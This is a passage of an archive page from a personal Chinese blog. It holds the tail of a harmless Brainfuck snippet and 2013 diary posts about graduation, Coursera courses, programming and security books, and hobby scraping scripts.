class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="string">.</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">+</span><span class="string">.</span><span class="literal">-</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="string">.</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;<span class="string">.</span>&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">+</span><span class="string">.</span><span class="literal">-</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;<span class="string">.</span>&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">+</span><span class="string">.</span><span class="literal">-</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">-</span><span class="string">.</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">+</span><span class="string">.</span><span class="literal">-</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">+</span><span class="string">.</span><span class="literal">-</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;<span class="string">.</span>&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">-</span><span class="string">.</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;<span class="string">.</span>&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="string">.</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;<span class="string">.</span>&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">-</span><span class="string">.</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="string">.</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<span class="string">.</span>
</code></pre><p>人生得意须尽欢：）</p>
<p>花堪折时只须折：）</p>
<h2 id="补记">补记</h2><p>Fri 24 May 2013 07:03:04 PM CST </p>
<p>谣传要交论文，基本上是两天给弄完了，好在之前真是认真了解这个课题了，吹起牛来一气呵成。</p>
<p>快毕业了一堆事，又是转党组织关系的又是填毕业登记表，又是毕业照体检。</p>
<p>班里没有毕业旅行感觉太好了，毫无兴致。</p>
<p>毕业把妹这种事……我还是不抱希望了……</p>
<p>整日整日地沉迷在图书馆和计算机前，偶尔的偶尔一个人出去转转。</p>
<p>哈，东边小操场没什么人，太喜欢在那边跑步了，江南的夜色依旧很美。记得有次跟着一个妹子跑了半个小时，第二天直接虚掉了= =</p>
<p>这几天就看了Professional Assembly Language一本书，断断续续看到浮点计算。把书上的代码跟着打了一遍，不得不说这本书真棒。例子都是神来之笔。</p>
<p>开始看《Hacking: The Art of Exploitation》, C语言那部分的例子真是让人觉得相见恨晚，由于看过以上几本书对汇编和堆栈比较熟悉发现看着真是享受。准备把书中所有的代码打一遍，太好玩了。</p>
<p>借了本《别闹了，费曼先生》，看得五体投地，这才是真黑客，真物理学家和数学家。</p>
<p>借了本《数学大师：从芝诺到庞加莱》，不得不说多好的一本书译得真有些不好懂……</p>
<p>这两本书我想单独写读后感。</p>
<p>因为毕业季一堆事，Coursera上Machine Learning这周到现在基本没看，High performance Scientific Computing直接被落下了，上周的视频还没看完，再加上进入Fortran和makefile的课题了，总有些力不从心。</p>
<p>最后吐槽下Girl-atlas，新上传的图像不仅打上水印而且只能查看缩略图了，而且下载链接也被移除了。很不爽，不能做壁纸的小图完全没有兴致再用脚本抓了。</p>
<p>结果愤而转向其它网站开始抓图……比如<a href="http://www.motu123.com/S_Cute/" target="_blank" rel="external">Motu</a>(<strong> Maybe 18X,慎点 </strong>), 再也没有<a href="http://girl-atlas.com/" target="_blank" rel="external">girl-atlas</a>老少咸宜高清无码的品味了。无论是图像更新及时度，图像质量，网站质量，girl-atlas做的都是最棒的.</p>
<h2 id="FootNotes">FootNotes</h2><p>[^1]: Deepin 开发者lovesnow(小邪兽)在贴吧贴过如何枚举linux下进程，好厉害好厉害，以前还见过他用python来hack植物大战僵尸= =，膜拜膜拜膜拜。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2013/05/13/graduation-season/" itemprop="url">
                  毕业季，青春的尾巴
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-05-13T00:00:00+08:00" content="2013-05-13">
              2013-05-13
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2013/05/13/graduation-season/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2013/05/13/graduation-season/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>转眼又是一年的五月中旬，我都不能记起之前的三年五月是什么样，我干了什么，想些什么，爱过什么，恨过什么。</p>
<p>只是这个五月，笼罩在无所事事的清闲和对未来捉摸不定的焦虑气氛中。</p>
<h2 id="毕业论文">毕业论文</h2><p>导师说，五月末就交终稿了。</p>
<p>然而一个字也不想写。</p>
<p>下雨的某天和室友去教室写了点论文，把绪论写完又写了一堆原理。相比一群复制粘帖的同学我竟然一直能自己有的写……</p>
<p>只是Goldstein算法实践了之后再也不想做什么了。</p>
<h2 id="Coursera">Coursera</h2><p>还有就是跟Coursera上课程，总有人喜欢做些 <em>没用</em> 的事。我觉得真该找些家教兼职出去丰富下社会经验换点外快，然而，总有些残想，唉。</p>
<p>认认真真地开始跟Coursera上的machine learning课程和High Performance Scientific Computing. 后来看到Introduction to data science和一门类似营养与健康的课。</p>
<p>最后，Introduction to data science作业难度实在够呛，营养健康感觉太欧美化了。最终只跟了前两门课。结果High Performance Scientific Computing课程在讲到使用Amazon Aws云服务时我跪了，尼玛屌丝没有信用卡……</p>
<p>Machine Learning在Coursera上比较简单，略过了让人抓狂的数学推导而集中精力讲解怎么实际实现算法和解决问题，主要用matlab或octave。感觉相当顺手唉。</p>
<p>High Performance Scientific Computing则讲了些我很熟悉的IPython + numpy +scipy科学计算工具集，还讲了点linux和Python，一点git的用法。总之，太熟悉了实在没什么压力。</p>
<p>Introduction to Data Science有的video没字幕，那老师的吐字我直接就跪了，后来发现有字幕的也不怎么看得懂……后来做了Problem012之后觉得作业压力大，几门课又是毕业论文还有其它想法，还是放弃这门课了。</p>
<p>最后门营养与健康的课。没想到上来就被各种计量单位和机构名称给搞跪了。</p>
<h2 id="爬虫">爬虫</h2><p>High Performance Scientific Computing课程的视频不允许下载，这很奇怪，也不合Coursera世界上每个人都能自由获取教育的理念。所以，我找了个冠冕堂皇的理由写了个脚本把用来下相应的MP4视频和字幕。</p>
<p>看到byr挂站排行榜写了个挂站脚本，扔到了Luoyun上。</p>
<p>重新装上了selenium。有空看看Grobot。</p>
<h2 id="其它">其它</h2><p>开着虚拟机写word论文，写着写着闻到糊味了……</p>
<p>后来zy就把笔记本散热器借我了。想论文写完自己拆机。</p>
<p>在图书馆看了看《漫画SQL》，果然只有漫画看得进去。</p>
<p>发现Gdb真是强大啊，今天竟然用来重定向其它pts程序的标准输出了，这些日子又零零散散看些汇编和逆向的基本知识，感觉又误入歧途了。</p>
<p>ps:难得还打了两次网球几次乒乓球。</p>
<p>pps: 图书馆妹子真多。</p>
<p>ppps：可惜不关我什么事，万花丛中过，片叶未沾身。</p>
<p>pppps：毕业旅行……毫无兴致呢</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2013/04/27/a-beautiful-night-in-jnu/" itemprop="url">
                  夜色
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-04-27T00:00:00+08:00" content="2013-04-27">
              2013-04-27
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2013/04/27/a-beautiful-night-in-jnu/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2013/04/27/a-beautiful-night-in-jnu/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>晚上又一个人独享了JNU摄人心魄的绝美夜色。从操场向东远望城市灯火映红天空，一轮初生的圆月，像一枚猩红的宝石，静悄悄凝视着大地。好像用画笔把那份惊艳记录下来。</p>
<p>这样的春夜将不多， JNU剩下的每个日子都将弥足珍贵。</p>
<p>回到学校这段日子，也许将是‘空前觉后’的安逸日子。然而这安逸平静的日子却弥漫着难抑的忧伤，朦朦胧胧，好像江南氤氲的湿气一样，即使在明媚祥和的春日里，也渗透得无处不再。</p>
<p>十六号回学校，今天二十七，除了些零零碎碎的事(比如面基。。)这十一天我开了几个线程：</p>
<ul>
<li>回来在导师面前晃了下，表示我回学校了，又问了问发现毕设难度又被降了一个等级。又把那之前在家写的不堪入目的添加branch cuts的七层for循环重新调试好了，结果今天发现去包裹算法有问题，竟然会出现2 pi整周期偏差，好吧，在老师面前还吹嘘简单……<a href="好吧，就是一维相位解包裹时出现的采样率不足情况。">^1</a></li>
<li>当我看到<a href="http://girl-atlas.com" target="_blank" rel="external">girl-atlas</a>这个有魅力的网站时，第一反应是把喜欢的写真集下载下来。结果这站用的竟然是什么城通网盘，翻越教育网的代理环境下根本无法下载。然后……竟然习惯性的打开page source细细查看，然后很熟练的写起来脚本抓图……后来，就诞生了这货<a href="https://github.com/reverland/scripts/blob/master/python/girl-atlas.py" target="_blank" rel="external">girl-atlas.py</a>，用来断断续续下了2.36G的写真图片。</li>
<li>开始看图书馆里借来的《python灰帽子》,饶有兴趣地在虚拟winxp下动手用Python实现一个简单的调试器。我就不说这本书错误多多了，算是明白豆瓣评分为什么这么低，名副其实……一行一行地敲代码并且调试N遍使之通过测试真不容易。</li>
</ul>
<p>大概就这，看到了有些东西，有空想折腾：</p>
<ul>
<li>让我把零零碎碎地把js语法赶紧看完</li>
<li>verletjs - 物理仿真js库</li>
<li>flask， 对girl-atlas的图片有些想法 XD</li>
</ul>
<h2 id="FootNotes">FootNotes</h2>
            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    

  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/9/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/11/"><i class="fa fa-angle-right"></i></a>
  </nav>



        </div>

        


        

      </div>

      
        
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Liu Yuyang" itemprop="image"/>
          <p class="site-author-name" itemprop="name">Liu Yuyang</p>
        </div>
        <p class="site-description motion-element" itemprop="description">我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">178</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            <a href="/categories">
              <span class="site-state-item-count">23</span>
              <span class="site-state-item-name">分类</span>
              </a>
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">63</span>
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/reverland" target="_blank">
                  
                    <i class="fa fa-github"></i> GitHub
                  
                </a>
              </span>
            
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
            <p class="site-author-name">Links</p>
            
              <span class="links-of-author-item">
                <a href="http://reverland.bitbucket.org/" target="_blank">曾经的的vimwiki</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://liutos.github.com/" target="_blank">Liutos</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.phoenixlzx.com/" target="_blank">凤凰君</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gndrive.org/" target="_blank">高达数字实验室</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.cherrot.com/" target="_blank">Cherrot</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://xwyam.github.com/" target="_blank">xw_y_am</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://ishell.me" target="_blank">小东</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.kochiya.me/" target="_blank">AS酱</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.skydark.info/" target="_blank">skydark</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://thorb.cn/" target="_blank">thorb</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.d0u9.xyz/" target="_blank">doug</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://armsword.com/" target="_blank">armsword</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://lilydjwg.is-programmer.com/" target="_blank">仙子</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://lazymind.me/" target="_blank">mapleray</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gaohaoyang.github.io" target="_blank">HYG</a>
              </span>
            
          
        </div>

      </section>

      

    </div>
  </aside>


      
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2011 - 
  <span itemprop="copyrightYear">2016</span>
  <span class="with-love">
    <i class="icon-next-heart fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Liu Yuyang</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT
  </a>
</div>



      </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  

  
    
    

  

    <script type="text/javascript">
      var disqus_shortname = 'reverlandblog';
      var disqus_identifier = 'page/10/index.html';
      var disqus_title = '';
      var disqus_url = '';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
    </script>
  


  

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>


  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  

  <script type="text/javascript" src="/js/bootstrap.js"></script>

  
  
  <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
  </script>

  <script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for (i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  </script>

  
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/MathJax.js"></script>
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/config/TeX-AMS-MML_HTMLorMML.js"></script>
  


  
  

</body>
</html>
